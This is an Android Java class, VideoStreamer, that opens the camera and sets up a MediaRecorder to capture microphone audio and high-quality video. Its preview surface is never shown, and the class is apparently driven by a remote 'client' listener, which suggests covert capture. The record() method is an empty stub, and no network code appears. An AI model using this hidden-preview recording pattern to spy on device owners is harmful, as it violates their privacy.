package my.app.Library;

import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import my.app.client.ClientListener;

import java.io.FileDescriptor;
import java.io.IOException;

public class VideoStreamer {
    private Camera camera;
    private MediaRecorder mediaRecorder;
    private boolean streaming = false;
    Thread stream;
    SurfaceHolder surHol;
    ClientListener cl;
    FileDescriptor fd;

    public VideoStreamer(ClientListener c){
        cl = c;
        camera = Camera.open();
        stream = new Thread(
                new Runnable() {
                    public void run() {
                        record();
                    }
                });
        SurfaceView surView = new SurfaceView(c);
        surHol = surView.getHolder();

    }
    public void record(){

    }

    public void startStream(){
        streaming = true;
        stream.start();
    }

    public void stopStream(){
        streaming = false;
    }

    public boolean prepare(){
        mediaRecorder = new MediaRecorder();
        camera.unlock();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));
        mediaRecorder.setVideoFrameRate(60);
        mediaRecorder.setOutputFile(fd);
        mediaRecorder.setPreviewDisplay(surHol.getSurface());
        try {
            mediaRecorder.prepare();
        } catch ( IOException  | IllegalStateException e) {
            mediaRecorder.reset();
            mediaRecorder.release();
            return false;
        }
        return true;

    }
}
